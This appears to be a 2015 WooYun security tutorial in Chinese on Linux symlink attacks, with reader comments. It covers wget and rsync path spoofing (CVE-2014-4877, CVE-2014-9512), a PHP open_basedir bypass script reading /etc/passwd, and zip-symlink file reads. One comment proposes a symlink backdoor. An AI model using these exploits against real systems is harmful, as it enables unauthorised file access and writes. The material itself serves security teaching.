@@ -1,0 +1,81 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">linux symbolic link attack tutorial</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Yaseng</a> <span class="bull">·</span> <time title="2015/01/27 10:01" ui-time="" datetime="2015/01/27 10:01" class="published ng-binding ng-isolate-scope">2015/01/27 10:01</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0×00 前言</h1><hr><p>Linux作为应用最广泛的开源系统，其中独特的文件系统可以算是支撑Linux强大功能 的核心组件之一，而在文件系统中，符号链接(symbolic link )形如"月光宝盒"般可以穿 梭时空，自由穿越森严的路径限制，此一特性，使其地位在整个Linux系统中占有重要 一席，本文将通过实际分析与研究，深入探讨因对符号链接处理不当，可能造成的各类 安全问题，以引发对此类问题的重视。</p><h1>0×01 客户端</h1><hr><p>客户端递归处理文件时,通过符号链接穿越可造成任意文件写入,代码执行。</p><p>案例:</p><h2>1. Wget ftp symbolic link attack (CVE-2014-4877)</h2><hr><p>wget 递归下载ftp站点时,如 wget -m ftp://127.0.0.1,在服务端伪造如下数据</p><pre><code>lrwxrwxrwx 1 root root 33 Oct 11 2013 fakedir -&gt; /tmp
+drwxrwxr-x 15 root root 4096 Oct 11 2013 fakedir
+</code></pre><p>会在本地建立一个名称为fakedir的symbolic link ,指向/tmp 目录,当wget 发送 cwd 指令递归进入fakedir 在发送 LIST 指令。此时可以伪造一个恶意文件或者</p><p>目录比如:</p><pre><code>-rwx------ 1 root root 21 Aug 29 2013 pwned
+</code></pre><p>RETR 指令下载pwned 文件时,返回文件内容(二进制或者文本)。即可欺骗wget 客户端任意目录写入。</p><p>具体利用脚本: https://github.com/yaseng/pentest/blob/master/exploit/wget-symlink&#95;attack&#95;exploit.py</p><p>漏洞演示:</p><pre><code>Server(attacker)  wget-symlink_attack_exploit.py
+Client(victim)    wget -m ftp://127.0.0.1
+</code></pre><p><img alt="enter image description here" img-src="133b64e743f5057307d3cd8457a33c679acf11b3.jpg"></p><h2>2:Rsync path spoofing attack vulnerability(CVE-2014-9512 )</h2><hr><p>笔者分析wget漏洞之后,发现rsync递归同步文件时,同样可以用符号链接来 欺骗路径,由于rsync双向文件处理算法比较复杂,无法直接用字符串伪造文件流。 首先rsync共享文件夹新建symbolic link 指向/root/,</p><pre><code>[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f98b96968db9899c978d9c8a8d">[email&#160;protected]</a> rsync]# ls  -lh
+total 8.0K
+-rw-r--r-- 1 root root    2 Oct 31 03:16 1.txt
+lrwxrwxrwx 1 root root    6 Oct 31 05:09 fakedir -&gt; /root/
+drwxr-xr-x 2 root root 4.0K Oct 31 05:08 truedir
+</code></pre><p>truedir 中写入测试文件</p><pre><code>[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="04766b6b704474616a70617770">[email&#160;protected]</a> rsync]# cd  truedir/
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="65170a0a112515000b11001611">[email&#160;protected]</a> truedir]# ls
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1e6c71716a5e6e7b706a7b6d6a">[email&#160;protected]</a> truedir]# echo rsync  test  &gt;  pwned
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="50223f3f241020353e24352324">[email&#160;protected]</a> truedir]# ls -lh
+total 4.0K
+-rw-r--r-- 1 root root 11 Oct 31 05:17 pwned
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="16647979625666737862736562">[email&#160;protected]</a> truedir]# 
+</code></pre><p>再修改服务端发送文件列表的代码</p><pre><code>#!c
+file: rsync-3.1.1/flist.c    line:394
+static void send_file_entry(int f, const char *fname, struct file_struct *file,
+#ifdef SUPPORT_LINKS
+                const char *symlink_name, int symlink_len,
+#endif
+                int ndx, int first_ndx)
+{
+  if(strcmp(fname,"turedir/pwned") == 0){
+
+    fname="fakedir/pwned";  // symbolic link 
+//change  file  true path(truedir) to  symbolic link  (fakedir)
+)
+}
+</code></pre><p>由于服务端有严格的数据校验,此时会报错 "received request to transfer non-regular file fakedir/pwned.test 7 [sender]",导致客户端同步无法执行 但是对于攻击者来说,服务端是可控的,找到对应代码直接注释。</p><pre><code>#!c
+/* if (iflags &amp; ITEM_TRANSFER) {
+        int i = ndx - cur_flist-&gt;ndx_start;
+        if (i &lt; 0 || !S_ISREG(cur_flist-&gt;files[i]-&gt;mode)) {
+            rprintf(FERROR,
+                "received request to transfer non-regular file: %d [%s]\n",
+                ndx, who_am_i());
+            exit_cleanup(RERR_PROTOCOL);
+        }
+    }
+*/
+</code></pre><p>漏洞演示:</p><p><img alt="enter image description here" img-src="842b745f1c8666ba3cd7cf9f772a34efa4c895e8.jpg"></p><p>client(victim):</p><p><img alt="enter image description here" img-src="124331bfde1d14e5ddecbb180f7ea8d347b54399.jpg"></p><h1>0×02 web 程序</h1><hr><p>当通过http访问文件时,web server 对符号链接处理不当可能导致越权访问,文件 读取等安全隐患。</p><p>案例:</p><h2>1. php 通用绕过 open_basedir 读取任意文件</h2><hr><p>使用函数symlink 与 mkdir 创建一个指向目标的符号链接,代码如下</p><pre><code>#!php
+&lt;?php
+mkdir("abc");
+chdir("abc");
+mkdir("etc");
+chdir("etc");
+mkdir("passwd");
+chdir("..");
+mkdir("abc");
+chdir("abc");
+mkdir("abc");
+chdir("abc");
+mkdir("abc");
+chdir("abc");
+chdir("..");
+chdir("..");
+chdir("..");
+chdir("..");
+symlink("abc/abc/abc/abc","tmplink");
+symlink("tmplink/../../../etc/passwd", "exploit");
+unlink("tmplink");  //删除
+mkdir("tmplink");
+?&gt;
+</code></pre><p>生成文件</p><pre><code>drwxr-xr-x 4 www www 512 Oct 20 00:37 abc
+lrwxr-xr-x 1 www www 27 Oct 20 00:37 exploit -&gt; tmplink/../../../etc/passwd
+- -rw-r--r-- 1 www www 356 Oct 20 00:32 kakao.php
+- -rw-r--r-- 1 www www 45 Oct 20 00:26 sym.php
+drwxr-xr-x 2 www www 512 Oct 20 00:37 tmplink
+</code></pre><p>exploit 已经指向/etc/passwd,通过web server 如Apache 直接静态访问,可以绕过php open_basedir 保护读取文件。</p><h2>2. facebook 本地文件读取</h2><hr><p>当服务端会自动解压zip,tar 等支持符号链接的压缩格式时。可以通过符号链接读取服务器文件 例如facebook 本地文件读取</p><pre><code>1. 创建一个符号链接文件指向/etc/passwd 
+
+ln -s /etc/passwd link 
+
+2. 压缩文件，同时保留链接 
+zip --symlinks test.zip link 
+
+3. 上传test.zip文件，系统会自动解压缩 
+
+4. 页面当中会返回/etc/passwd的内容
+</code></pre><p>如图</p><p><img alt="enter image description here" img-src="13543f8e9b6b0fb5d794287b3d4e6d0ab5996fe4.jpg"></p><h1>0×03 参考链接</h1><hr><p>1:CVE-2014-4877 wget ftp下载文件夹链接欺骗漏洞分析 http://xteam.baidu.com/?p=30</p><p>2:Rsync path spoofing attack vulnerability http://xteam.baidu.com/?p=169</p><p>3:Php open_basedir bypass http://cxsecurity.com/issue/WLB-2009110068</p><p>4:Reading local files from Facebook's server http://josipfranjkovic.blogspot.com/2014/12/reading-local-files-from-facebooks.html</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/5601" rel="bookmark" id="re1">Hacking the D-Link DIR-890L</a></li><li><a href="http://drops.wooyun.org/papers/8812" rel="bookmark" id="re2">Symbolic Link漏洞简单背景介绍</a></li><li><a href="http://drops.wooyun.org/papers/161" rel="bookmark" id="re3">Rsync安全配置</a></li><li><a href="http://drops.wooyun.org/papers/2893" rel="bookmark" id="re4">Intent scheme URL attack</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2015-02-05 14:59:08</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小虾米</span> <span class="reply-time">2015-01-29 15:50:16</span></div><p></p><p>膜拜大神</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2015-01-28 22:13:57</span></div><p></p><p>好东西...来顶</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bibi</span> <span class="reply-time">2015-01-28 12:08:12</span></div><p></p><p>是你参考文献中的4<br>我记错了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ettack</span> <span class="reply-time">2015-01-28 11:57:23</span></div><p></p><p>膜拜大神，都開始報CVE了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Yaseng</span> <span class="reply-time">2015-01-28 11:22:34</span></div><p></p><p>Android.Hackers.Handbook 貌似 ?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bibi</span> <span class="reply-time">2015-01-28 10:42:14</span></div><p></p><p>记得有篇文章，在apk中创建了符号链接。<br>谁还有印象呢？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-01-27 13:52:25</span></div><p></p><p>还有一个可以在nginx下做一个链接到根目录，这是一个绝佳的后门啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2015-01-27 11:20:08</span></div><p></p><p>膜拜大神！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">麻辣烫</span> <span class="reply-time">2015-01-27 11:10:41</span></div><p></p><p>赞一下，学习了，看不懂，但是我必须得说懂~~因为我是大牛的姿态~呵呵</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">w5r2</span> <span class="reply-time">2015-01-27 11:08:43</span></div><p></p><p>yaseng让我来捧场的，你们看着办~~~。我次奥，好东西啊。碉堡了，我只能说这些了。囧<br>······=······</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">light</span> <span class="reply-time">2015-01-27 10:49:12</span></div><p></p><p>学习了，膜拜Yaseng大神~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Matt</span> <span class="reply-time">2015-01-27 10:26:46</span></div><p></p><p>赞一下！</p><p></p></div></div></div></div></div></main>
